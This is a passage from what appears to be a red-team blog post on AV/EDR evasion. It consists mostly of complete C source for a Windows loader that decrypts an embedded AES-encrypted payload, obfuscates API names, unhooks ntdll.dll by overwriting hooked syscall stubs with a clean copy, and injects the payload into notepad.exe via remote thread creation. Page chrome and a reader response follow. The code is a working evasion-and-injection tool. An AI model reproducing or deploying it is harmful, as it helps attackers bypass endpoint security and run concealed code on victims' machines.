class="hljs-number">0x44</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x8</span> };<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[] = { <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x84</span> };<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> payload_len = <span class="hljs-keyword">sizeof</span>(payload);<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title.function">BOOL</span> <span class="hljs-params">(WINAPI * VirtualProtect_t)</span><span class="hljs-params">(LPVOID, SIZE_T, DWORD, PDWORD)</span>;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sNtdll[] = { <span class="hljs-string">'n'</span>, <span class="hljs-string">'t'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'.'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-number">0x0</span> };<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sKernel32[] = { <span class="hljs-string">'k'</span>,<span class="hljs-string">'e'</span>,<span class="hljs-string">'r'</span>,<span class="hljs-string">'n'</span>,<span class="hljs-string">'e'</span>,<span class="hljs-string">'l'</span>,<span class="hljs-string">'3'</span>,<span class="hljs-string">'2'</span>,<span class="hljs-string">'.'</span>,<span class="hljs-string">'d'</span>,<span class="hljs-string">'l'</span>,<span class="hljs-string">'l'</span>, <span class="hljs-number">0x0</span> };<br><br><span class="hljs-type">int</span> <span class="hljs-title.function">AESDecrypt</span><span class="hljs-params">(<span class="hljs-type">char</span> * payload, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> payload_len, <span class="hljs-type">char</span> * key, <span class="hljs-type">size_t</span> keylen)</span> {<br> HCRYPTPROV hProv;<br> HCRYPTHASH hHash;<br> HCRYPTKEY hKey;<br><br> <span class="hljs-keyword">if</span> (!CryptAcquireContextW(&amp;hProv, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br> }<br> <span class="hljs-keyword">if</span> (!CryptCreateHash(hProv, CALG_SHA_256, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;hHash)){<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br> }<br> <span class="hljs-keyword">if</span> (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, <span class="hljs-number">0</span>)){<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;              <br> }<br> <span class="hljs-keyword">if</span> (!CryptDeriveKey(hProv, CALG_AES_256, hHash, <span class="hljs-number">0</span>,&amp;hKey)){<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br> }<br> <br> <span class="hljs-keyword">if</span> (!CryptDecrypt(hKey, (HCRYPTHASH) <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (BYTE *) payload, (DWORD *) &amp;payload_len)){<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br> }<br> <br> CryptReleaseContext(hProv, <span class="hljs-number">0</span>);<br> CryptDestroyHash(hHash);<br> CryptDestroyKey(hKey);<br> <br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br><br><span class="hljs-type">int</span> <span class="hljs-title.function">FindTarget</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *procname)</span> {<br><br> HANDLE hProcSnap;<br> PROCESSENTRY32 pe32;<br> <span class="hljs-type">int</span> pid = <span class="hljs-number">0</span>;<br>   <br> hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br> <span class="hljs-keyword">if</span> (INVALID_HANDLE_VALUE == hProcSnap) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br> <span class="hljs-comment">//printf("snapshot taken! %x\n", hProcSnap);</span><br> pe32.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32); <br>   <br> <span class="hljs-keyword">if</span> (!Process32First(hProcSnap, &amp;pe32)) {<br>   CloseHandle(hProcSnap);<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> }<br> <br> <span class="hljs-comment">//printf("going thru snapshot!\n");</span><br> <br> <span class="hljs-keyword">while</span> (Process32Next(hProcSnap, &amp;pe32)) {<br>  <span class="hljs-comment">//printf("Found: %30s\n", pe32.szExeFile);</span><br>  <span class="hljs-keyword">if</span> (lstrcmpiA(procname, pe32.szExeFile) == <span class="hljs-number">0</span>) {<br>    pid = pe32.th32ProcessID;<br>    <span class="hljs-keyword">break</span>;<br>  }<br> }<br>   <br> CloseHandle(hProcSnap);<br>   <br> <span class="hljs-keyword">return</span> pid;<br>}<br><br><br><span class="hljs-comment">// classic injection</span><br><span class="hljs-type">int</span> <span class="hljs-title.function">Inject</span><span class="hljs-params">(HANDLE hProc, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * payload, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> payload_len)</span> {<br><br> LPVOID pRemoteCode = <span class="hljs-literal">NULL</span>;<br> HANDLE hThread = <span class="hljs-literal">NULL</span>;<br><br> <span class="hljs-comment">// Decrypt payload</span><br> AESDecrypt((<span class="hljs-type">char</span> *) payload, payload_len, (<span class="hljs-type">char</span> *) key, <span class="hljs-keyword">sizeof</span>(key));<br> <br> pRemoteCode = VirtualAllocEx(hProc, <span class="hljs-literal">NULL</span>, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);<br> WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) <span class="hljs-literal">NULL</span>);<br> <br> hThread = CreateRemoteThread(hProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE) pRemoteCode, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br> <span class="hljs-keyword">if</span> (hThread != <span class="hljs-literal">NULL</span>) {<br>   WaitForSingleObject(hThread, <span class="hljs-number">500</span>);<br>   CloseHandle(hThread);<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> }<br> <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>}<br><br><br><span class="hljs-type">int</span> <span class="hljs-title.function">FindFirstSyscall</span><span class="hljs-params">(<span class="hljs-type">char</span> * pMem, DWORD size)</span>{<br> <br> <span class="hljs-comment">// gets the first byte of first syscall</span><br> DWORD i = <span class="hljs-number">0</span>;<br> DWORD offset = <span class="hljs-number">0</span>;<br> BYTE pattern1[] = <span class="hljs-string">"\x0f\x05\xc3"</span>;  <span class="hljs-comment">// syscall ; ret</span><br> BYTE pattern2[] = <span class="hljs-string">"\xcc\xcc\xcc"</span>;  <span class="hljs-comment">// int3 * 3</span><br> <br> <span class="hljs-comment">// find first occurance of syscall+ret instructions</span><br> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; size - <span class="hljs-number">3</span>; i++) {<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">memcmp</span>(pMem + i, pattern1, <span class="hljs-number">3</span>)) {<br>   offset = i;<br>   <span class="hljs-keyword">break</span>;<br>  }<br> }  <br> <br> <span class="hljs-comment">// now find the beginning of the syscall</span><br> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">3</span>; i &lt; <span class="hljs-number">50</span> ; i++) {<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">memcmp</span>(pMem + offset - i, pattern2, <span class="hljs-number">3</span>)) {<br>   offset = offset - i + <span class="hljs-number">3</span>;<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"First syscall found at 0x%p\n"</span>, pMem + offset);<br>   <span class="hljs-keyword">break</span>;<br>  }  <br> }<br><br> <span class="hljs-keyword">return</span> offset;<br>}<br><br><br><span class="hljs-type">int</span> <span class="hljs-title.function">FindLastSysCall</span><span class="hljs-params">(<span class="hljs-type">char</span> * pMem, DWORD size)</span> {<br><br> <span class="hljs-comment">// returns the last byte of the last syscall</span><br> DWORD i;<br> DWORD offset = <span class="hljs-number">0</span>;<br> BYTE pattern[] = <span class="hljs-string">"\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc"</span>;  <span class="hljs-comment">// syscall ; ret ; int 2e ; ret ; int3 * 3</span><br> <br> <span class="hljs-comment">// backwards lookup</span><br> <span class="hljs-keyword">for</span> (i = size - <span class="hljs-number">9</span>; i &gt; <span class="hljs-number">0</span>; i--) {<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">memcmp</span>(pMem + i, pattern, <span class="hljs-number">9</span>)) {<br>   offset = i + <span class="hljs-number">6</span>;<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Last syscall byte found at 0x%p\n"</span>, pMem + offset);<br>   <span class="hljs-keyword">break</span>;<br>  }<br> }  <br> <br> <span class="hljs-keyword">return</span> offset;<br>}<br>  <br>  <br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title.function">UnhookNtdll</span><span class="hljs-params">(<span class="hljs-type">const</span> HMODULE hNtdll, <span class="hljs-type">const</span> LPVOID pCache)</span> {<br><span class="hljs-comment">/*<br>    UnhookNtdll() finds fresh "syscall table" of ntdll.dll from suspended process and copies over onto hooked one<br>*/</span><br> DWORD oldprotect = <span class="hljs-number">0</span>;<br> PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pCache;<br> PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pCache + pImgDOSHead-&gt;e_lfanew);<br> <span class="hljs-type">int</span> i;<br><br> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sVirtualProtect[] = { <span class="hljs-string">'V'</span>,<span class="hljs-string">'i'</span>,<span class="hljs-string">'r'</span>,<span class="hljs-string">'t'</span>,<span class="hljs-string">'u'</span>,<span class="hljs-string">'a'</span>,<span class="hljs-string">'l'</span>,<span class="hljs-string">'P'</span>,<span class="hljs-string">'r'</span>,<span class="hljs-string">'o'</span>,<span class="hljs-string">'t'</span>,<span class="hljs-string">'e'</span>,<span class="hljs-string">'c'</span>,<span class="hljs-string">'t'</span>, <span class="hljs-number">0x0</span> };<br> <br> VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);<br> <br> <span class="hljs-comment">// find .text section</span><br> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; pImgNTHead-&gt;FileHeader.NumberOfSections; i++) {<br>  PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));<br><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>((<span class="hljs-type">char</span> *)pImgSectionHead-&gt;Name, <span class="hljs-string">".text"</span>)) {<br>   <span class="hljs-comment">// prepare ntdll.dll memory region for write permissions.</span><br>   VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead-&gt;VirtualAddress),<br>       pImgSectionHead-&gt;Misc.VirtualSize,<br>       PAGE_EXECUTE_READWRITE,<br>       &amp;oldprotect);<br>   <span class="hljs-keyword">if</span> (!oldprotect) {<br>     <span class="hljs-comment">// RWX failed!</span><br>     <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>   }<br><br>   <span class="hljs-comment">// copy clean "syscall table" into ntdll memory</span><br>   DWORD SC_start = FindFirstSyscall((<span class="hljs-type">char</span> *) pCache, pImgSectionHead-&gt;Misc.VirtualSize);<br>   DWORD SC_end = FindLastSysCall((<span class="hljs-type">char</span> *) pCache, pImgSectionHead-&gt;Misc.VirtualSize);<br>   <br>   <span class="hljs-keyword">if</span> (SC_start != <span class="hljs-number">0</span> &amp;&amp; SC_end != <span class="hljs-number">0</span> &amp;&amp; SC_start &lt; SC_end) {<br>    DWORD SC_size = SC_end - SC_start;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"dst (in ntdll): %p\n"</span>, ((DWORD_PTR) hNtdll + SC_start));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"src (in cache): %p\n"</span>, ((DWORD_PTR) pCache + SC_start));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"size: %i\n"</span>, SC_size);<br>    getchar();<br>    <span class="hljs-built_in">memcpy</span>( (LPVOID)((DWORD_PTR) hNtdll + SC_start),<br>      (LPVOID)((DWORD_PTR) pCache + + SC_start),<br>      SC_size);<br>   }<br><br>   <span class="hljs-comment">// restore original protection settings of ntdll</span><br>   VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead-&gt;VirtualAddress),<br>       pImgSectionHead-&gt;Misc.VirtualSize,<br>       oldprotect,<br>       &amp;oldprotect);<br>   <span class="hljs-keyword">if</span> (!oldprotect) {<br>     <span class="hljs-comment">// it failed</span><br>     <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>   }<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  }<br> }<br> <br> <span class="hljs-comment">// failed? .text not found!</span><br> <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>}<br><br><br><span class="hljs-type">int</span> <span class="hljs-title.function">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> {<br>    <br> <span class="hljs-type">int</span> pid = <span class="hljs-number">0</span>;<br>    HANDLE hProc = <span class="hljs-literal">NULL</span>;<br> <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br> STARTUPINFOA si = { <span class="hljs-number">0</span> };<br> PROCESS_INFORMATION pi = { <span class="hljs-number">0</span> };<br> <br> BOOL success = CreateProcessA(<br>  <span class="hljs-literal">NULL</span>, <br>  (LPSTR)<span class="hljs-string">"cmd.exe"</span>, <br>  <span class="hljs-literal">NULL</span>, <br>  <span class="hljs-literal">NULL</span>, <br>  FALSE, <br>  CREATE_SUSPENDED | CREATE_NEW_CONSOLE,<br>  <span class="hljs-comment">//CREATE_NEW_CONSOLE,</span><br>  <span class="hljs-literal">NULL</span>, <br>  <span class="hljs-string">"C:\\Windows\\System32\\"</span>, <br>  &amp;si, <br>  &amp;pi);<br><br> <span class="hljs-keyword">if</span> (success == FALSE) {<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!] Error: Could not call CreateProcess\n"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br> } <br><br> <span class="hljs-comment">// get the size of ntdll module in memory</span><br> <span class="hljs-type">char</span> * pNtdllAddr = (<span class="hljs-type">char</span> *) GetModuleHandle(<span class="hljs-string">"ntdll.dll"</span>);<br> IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pNtdllAddr;<br> IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pNtdllAddr + pDosHdr-&gt;e_lfanew);<br> IMAGE_OPTIONAL_HEADER * pOptionalHdr = &amp;pNTHdr-&gt;OptionalHeader;<br> <br> SIZE_T ntdll_size = pOptionalHdr-&gt;SizeOfImage;<br> <br> <span class="hljs-comment">// allocate local buffer to hold temporary copy of clean ntdll from remote process</span><br> LPVOID pCache = VirtualAlloc(<span class="hljs-literal">NULL</span>, ntdll_size, MEM_COMMIT, PAGE_READWRITE);<br> <br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ntdll size: %x | cache: %p\n"</span>, ntdll_size, pCache);<br> <br> SIZE_T bytesRead = <span class="hljs-number">0</span>;<br> <span class="hljs-keyword">if</span> (!ReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &amp;bytesRead))<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error reading: %d | %x\n"</span>, bytesRead, GetLastError());<br> <br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Kill?"</span>); getchar();<br> <br> TerminateProcess(pi.hProcess, <span class="hljs-number">0</span>);<br> <br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Done.\n"</span>); getchar();<br><br> <span class="hljs-comment">// remove hooks</span><br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Unhooking ntdll\n"</span>);<br> ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pCache);<br><br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"YAY!\n"</span>); getchar(); <br><br> <span class="hljs-comment">// Clean up.</span><br> VirtualFree(pCache, <span class="hljs-number">0</span>, MEM_RELEASE);<br> <br> pid = FindTarget(<span class="hljs-string">"notepad.exe"</span>);<br> <br> <span class="hljs-keyword">if</span> (pid) {<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Notepad.exe PID = %d\n"</span>, pid);<br><br>  <span class="hljs-comment">// try to open target process</span><br>  hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | <br>      PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,<br>      FALSE, (DWORD) pid);<br><br>  <span class="hljs-keyword">if</span> (hProc != <span class="hljs-literal">NULL</span>) {<br>   Inject(hProc, payload, payload_len);<br>   CloseHandle(hProc);<br>  }<br> }<br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}</span></pre><p id="d525" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">And that concludes our discussion of unhooking techniques. In the next section, we will explore the topic of Hiding Process Memory. Thank you for reading and showing interest in this subject.</p><p id="260a" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">Thanks for reading !</p></div></div></div></div></section></div></div></article></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="rj rk ac ji"><div class="rl ac"><a class="rm ak ao aq" rel="noopener follow" href="https://medium.com/tag/hacking?source=post_page-----3229b75618f7---------------------------------------" data-discover="true"><div class="rn fr de ro gv rp rq bg b bh ab bl gc">Hacking</div></a></div><div class="rl ac"><a class="rm ak ao aq" rel="noopener follow" href="https://medium.com/tag/av-evasion?source=post_page-----3229b75618f7---------------------------------------" data-discover="true"><div class="rn fr de ro gv rp rq bg b bh ab bl gc">Av Evasion</div></a></div><div class="rl ac"><a class="rm ak ao aq" rel="noopener follow" href="https://medium.com/tag/cybersecurity?source=post_page-----3229b75618f7---------------------------------------" data-discover="true"><div class="rn fr de ro gv rp rq bg b bh ab bl gc">Cybersecurity</div></a></div><div class="rl ac"><a class="rm ak ao aq" rel="noopener follow" href="https://medium.com/tag/red-teaming?source=post_page-----3229b75618f7---------------------------------------" data-discover="true"><div class="rn fr de ro gv rp rq bg b bh ab bl gc">Red Teaming</div></a></div><div class="rl ac"><a class="rm ak ao aq" rel="noopener follow" href="https://medium.com/tag/malware-analysis?source=post_page-----3229b75618f7---------------------------------------" data-discover="true"><div class="rn fr de ro gv rp rq bg b bh ab bl gc">Malware Analysis</div></a></div></div></div></div><div class="m"></div><div class="sf m"><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="ac iv it ir sg sh"><div class="si sj sk sl sm sn so sp sq sr ac cw"><div class="i l"><a tabindex="0" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---post_author_info--3229b75618f7---------------------------------------" data-discover="true"><div class="m fr"><img alt="Hossam Ehab" class="m fk by ss st de" width="48" height="48" loading="lazy" src="https://miro.medium.com/v2/resize:fill:48:48/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m ss st fw o ak su"></div></div></a></div><div class="k j e"><a tabindex="0" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---post_author_info--3229b75618f7---------------------------------------" data-discover="true"><div class="m fr"><img alt="Hossam Ehab" class="m fk by sv sw de" width="64" height="64" loading="lazy" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m sv sw fw o ak su"></div></div></a></div><div class="k j e sx cb"><div class="ac"><button class="uk yp aq ac ci r yv kq yw" style="border: 1px solid rgba(19, 19, 19, 0.525);"><span class="bg b bh ab bl bi"><span class="bn yt">Follow</span></span></button></div></div></div><div class="ac cv cd"><div class="sy sz ta tb tc m"><a class="ah ai aj al am an ao ap aq ar as at au av ac r" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---post_author_info--3229b75618f7---------------------------------------" data-discover="true"><h2 class="pw-author-name bg te tf tg th ti tj tk od tl tm oh tn to ol tp tq bl"><span class="he td">Written by Hossam Ehab</span></h2></a><div class="rl ac ix"><div class="m cb"><span class="pw-follower-count bg b bh ab eb"><a class="ah ai aj fo al am an ao ap aq ar as at jg" rel="noopener follow" href="https://medium.com/@0xHossam/followers?source=post_page---post_author_info--3229b75618f7---------------------------------------" data-discover="true">638 followers</a></span></div><div class="bg b bh ab eb ac tr"><span class="ts m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span><a class="ah ai aj fo al am an ao ap aq ar as at jg" rel="noopener follow" href="https://medium.com/@0xHossam/following?source=post_page---post_author_info--3229b75618f7---------------------------------------" data-discover="true">101 following</a></div></div><div class="qz m"><p class="bg b bh ab bl">Red Team Operator @ Cyshield. LinkedIn -&gt;<a class="ah ai aj fo al am an ao ap aq ar as at ov hf he" href="http://linkedin.com/in/0xHossam" rel="noopener  ugc nofollow">linkedin.com/in/0xHossam</a> | interested in malware &amp; windows security research | <a class="ah ai aj fo al am an ao ap aq ar as at ov hf he" href="http://x.com/0xHossam" rel="noopener  ugc nofollow">x.com/0xHossam</a></p></div></div></div><div class="i l"><div class="ac"><button class="uk yp aq ac ci r yv kq yw" style="border: 1px solid rgba(19, 19, 19, 0.525);"><span class="bg b bh ab bl bi"><span class="bn yt">Follow</span></span></button></div></div></div></div></div></div><div class="tt tu tv tw tx m"><div class="ty bi s sf"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="ac r cw"><h2 class="bg te mx mz na nb nd ne nf nh ni nj nl nm nn np nq bl">Responses (1)</h2><div class="ac tz"><div><div class="bn" aria-describedby="15" aria-labelledby="15" role="tooltip"><div tabindex="-1" class="bf"><a class="ua ub" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--3229b75618f7---------------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" aria-label="Shield with a checkmark" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div></div><div class="uc ud ue uf ug uh ui m"><div><div class="bg b bh ab bl"><div class="xx"><div class="yf m"><div class="yg ac r"><div class="m fr"><img alt="" class="m fk by bz ca de" width="32" height="32" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m bz ca fw o ak su"></div></div><div class="bo ac cu cv ci"><p class="bg b bh ab eb">Write a response</p></div></div><div class="de bq ac cv xy xz"><div class="ac cv fr"><span data-dd-action-name="Susi presentation tracker respond_sidebar"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Funhooking-memory-object-hiding-3229b75618f7&amp;source=---post_responses--3229b75618f7---------------------respond_sidebar------------------" data-discover="true"><div class="wb m"><p class="bg b bh ab eb">What are your thoughts?</p></div></a></span><div class="cw ya eb ac yb xb yc"><span class="bg b bh ab eb"><div class="ac"><div><div class="bn" aria-describedby="28" aria-labelledby="28" role="tooltip"><div tabindex="-1" class="bf"><span role="button" aria-label="Bold (⌘B)" class="yh yi yj yk bq lv ci yl ym yn" tabindex="0"><svg width="21" height="21"><path fill-rule="evenodd" d="M10.308 17.993h-5.92l.11-.894.783-.12c.56-.11.79-.224.79-.448V5.37c0-.225-.113-.336-.902-.448H4.5l-.114-.894h6.255c4.02 0 5.58 1.23 5.58 3.13 0 1.896-1.78 3.125-3.79 3.463v.11c2.69.34 4.25 1.56 4.25 3.57 0 2.35-2.01 3.69-6.37 3.69l.02.01h-.02zm-.335-12.96H8.967V10.5h1.23c1.788 0 2.79-1.23 2.79-2.683 0-1.685-1.004-2.803-3.006-2.803v.02zm-.223 6.36h-.783v5.588l1.225.23h.22c1.67 0 3.01-1.004 3.01-2.792 0-2.122-1.566-3.016-3.69-3.016h.018z"></path></svg></span></div></div></div><div><div class="bn" aria-describedby="29" aria-labelledby="29" role="tooltip"><div tabindex="-1" class="bf"><span role="button" aria-label="Italic (⌘I)" class="yh yi yj yk bq lv ci yl ym yn" tabindex="0"><svg width="21" height="21"><path fill-rule="evenodd" d="M9.847 18.04c-.533 0-2.027-.64-1.92-.853l2.027-7.68-.64-.214-1.387 1.494-.427-.427c.534-1.173 1.707-2.667 2.774-2.667.533 0 2.24.534 2.133.854l-2.133 7.786.533.214 1.6-1.067.427.427c-.64 1.066-1.92 2.133-2.987 2.133m2.347-11.733c-.96 0-1.387-.64-1.387-1.387 0-1.067.747-1.92 1.493-1.92.854 0 1.387.64 1.387 1.493-.107 1.067-.747 1.814-1.493 1.814"></path></svg></span></div></div></div></div></span><div class="yd sx ac yb xb yc"><div class="ye"><button class="bg b ec ab bl yo uj uk ul lu lr um fc fd fe un uo up fh fi fj fk bn fl fm" data-testid="CancelResponseButton">Cancel</button></div><button class="bg b ec ab wo yo wp wq wr ws um fc fd wt wu wv fh fi fj fk bn fl fm" disabled="" data-testid="ResponseRespondButton">Respond</button></div></div></div></div></div></div></div></div></div><div class="ud m"><div class="bi ed"><div class="yx yy m"><div class="ac cw"><div class="ac r"><div><div class="bn" aria-describedby="74" aria-labelledby="74" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/@ezqoxzx395?source=post_page---post_responses--3229b75618f7----0-----------------------------------" data-discover="true"><div class="m fr"><div class="m fr"><img alt="Security geek" class="m fk by bz ca de" width="32" height="32" loading="lazy" src="https://miro.medium.com/v2/resize:fill:32:32/1*YQGwtpOGecZajkbh2HMMGA.jpeg"><div class="gj by m bz ca fw o ak gk"></div></div></div></a></div></div></div><div class="yz m"><div class="ac r"><div><div class="bn" aria-describedby="75" aria-labelledby="75" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at au av ac r za zb" rel="noopener follow" href="https://medium.com/@ezqoxzx395?source=post_page---post_responses--3229b75618f7----0-----------------------------------" data-discover="true"><div class="ac ix za"><p class="bg b bh ab ga zc zd ze zf zg zh zi bl">Security geek</p></div></a></div></div></div></div><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/@ezqoxzx395/very-cool-technique-c3d83ae6c5b3?source=post_page---post_responses--3229b75618f7----0-----------------------------------" data-discover="true"><p class="bg b ec ab eb"><span>Dec 19, 2024</span></p></a></div></div><div class="bn"><button class="ah fs aj fo al am an mc ap aq ar fe md me ls mf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" 